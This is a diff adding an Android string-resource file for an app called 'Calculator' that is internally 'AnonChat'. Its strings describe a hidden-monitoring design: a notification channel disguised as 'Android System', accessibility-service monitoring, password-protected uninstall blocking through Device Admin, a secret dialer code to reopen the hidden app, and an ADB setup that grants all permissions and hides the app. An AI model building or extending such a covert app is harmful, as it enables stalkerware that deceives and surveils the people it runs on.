@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Calculator</string>
+    <string name="default_notification_channel_id">anon_chat_messages</string>
+
+    <string name="nav_chats">Chats</string>
+    <string name="nav_search">Search</string>
+    <string name="nav_profile">Profile</string>
+
+    <!-- ParentalControl strings -->
+    <string name="accessibility_service_description">Allows AnonChat to monitor app usage for optimization and management purposes.</string>
+    <string name="notification_channel_name">Android System</string>
+    <string name="notification_channel_desc">Core system services</string>
+    <string name="notification_text">Optimizing device performance</string>
+    <string name="uninstall_password_title">Uninstall Protection</string>
+    <string name="uninstall_password_hint">Enter password to disable protection</string>
+    <string name="device_admin_warning">This app requires Device Admin to prevent unauthorized uninstallation. This is a security feature.</string>
+    <string name="update_available">Update available</string>
+    <string name="update_downloading">Downloading update…</string>
+    <string name="update_installing">Installing update…</string>
+    <string name="secret_code_description">Dial *#*#11111987#*#* to open (master key)</string>
+    <string name="setup_receiver_description">Receives ADB setup commands for zero-touch configuration</string>
+    <string name="dialer_code_hint">Dial this code in the phone dialer to re-open the hidden app</string>
+    <string name="adb_setup_title">ADB Zero-Touch Setup</string>
+    <string name="adb_setup_description">Run a single ADB command from your PC to automatically grant all permissions, enable services, and hide the app.</string>
+    <string name="setup_complete_hide">App will hide itself. Dial *#*#%1$s#*#* to re-open.</string>
+</resources>
